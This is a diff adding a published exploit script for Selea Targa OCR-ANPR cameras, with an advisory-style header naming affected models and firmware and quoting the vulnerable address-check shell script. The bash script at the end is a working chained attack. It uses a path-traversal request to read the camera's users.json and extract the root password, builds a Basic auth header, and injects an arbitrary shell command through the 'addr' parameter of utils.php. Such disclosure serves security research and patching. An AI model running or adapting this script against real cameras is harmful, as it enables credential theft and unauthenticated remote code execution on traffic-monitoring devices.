@@ -1,0 +1,109 @@
+# Exploit Title: Selea Targa IP OCR-ANPR Camera - 'addr' Remote Code Execution (Unauthenticated)
+# Date: 07.11.2020
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.selea.com
+
+#!/bin/bash
+#
+# Selea Targa IP OCR-ANPR Camera Unauthenticated Remote Code Execution
+#
+#
+# Vendor: Selea s.r.l.
+# Product web page: https://www.selea.com
+# Affected version: Model: iZero
+#                          Targa 512
+#                          Targa 504
+#                          Targa Semplice
+#                          Targa 704 TKM
+#                          Targa 805
+#                          Targa 710 INOX
+#                          Targa 750
+#                          Targa 704 ILB
+#                   Firmware: BLD201113005214
+#                             BLD201106163745
+#                             BLD200304170901
+#                             BLD200304170514
+#                             BLD200303143345
+#                             BLD191118145435
+#                             BLD191021180140
+#                             BLD191021180140
+#                   CPS: 4.013(201105)
+#                        3.100(200225)
+#                        3.005(191206)
+#                        3.005(191112)
+#
+# Summary: IP camera with optical character recognition (OCR) software for automatic
+# number plate recognition (ANPR) also equipped with ADR system that enables it to read
+# the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
+# of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
+# plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
+# this camera suitable for all installation conditions. Its built-in OCR software works
+# as an automatic and independent system without the need of a computer, thus giving
+# autonomy to the device even in the event of an interruption in the connection between
+# the camera and the operations centre.
+#
+# Desc: Selea suffers from an authenticated command injection vulnerability. This can be
+# exploited to inject and execute arbitrary shell commands as the www-data user through
+# the 'addr' and 'port' HTTP GET parameters in utils.php page. Chaining the unauthenticated
+# LFI issue an attacker can grab credentials, authenticate and execute system commands.
+#
+# =====================================================================================
+# /mnt/app/scripts/address_check.sh:
+# ----------------------------------
+#
+# 01: #!/bin/sh
+# 02: . /mnt/app/scripts/env.sh
+# 03: . /mnt/app/scripts/log.sh
+# 04:
+# 05: CMD="$1"
+# 06: ADDR="$2"
+# 07: PORT="$3"
+# 08:
+# 09: if [ "$CMD" == "ping" ]; then
+# 10:   RESULT=$(/bin/ping -I eth0 -W 1 -q -c 1 "$ADDR" 2>&1 )
+# 11: elif [ "$CMD" == "port" ]; then
+# 12:   log "/usr/bin/nc -w 1 -v -z $ADDR $PORT"
+# 13:   RESULT=$(/usr/bin/nc -w 1 -v -z "$ADDR" "$PORT" 2>&1 )
+# 14: fi
+# 15:
+# 16: echo -e "$RESULT"
+#
+# =====================================================================================
+#
+# Tested on: GNU/Linux 3.10.53 (armv7l)
+#            PHP/5.6.22
+#            selea_httpd
+#            HttpServer/0.1
+#            SeleaCPSHttpServer/1.1
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2021-5620
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5620.php
+#
+#
+# 07.11.2020
+#
+#
+
+
+# PoC chained exploit (as admin):
+#
+# solidsnake@metalgear:~/prive$ ./selea.sh 192.168.1.17 id
+# Password found: testingus
+# Using Authorization: YWRtaW46dGVzdGluZ3VzCg==
+# Using command: id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#
+#
+IP=$1
+CMD=$2
+PWD=`curl -s http://${IP}/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fmnt/data/auth/users.json |grep -oP 'root_pwd": "\K.*?(?=",)'`
+echo 'Password found: '${PWD}
+AUTH=$(echo admin:${PWD} | base64)
+echo 'Using Authorization: '${AUTH}
+echo 'Using command: '${CMD}
+curl -s "http://${IP}/cgi-bin/utils.php?cmd=addr_check&addr=1.3.3.7\$(${CMD})&type=port&port=80" -H "Authorization: Basic ${AUTH}" |grep -oP '1.3.3.7\K.*?(?=")'
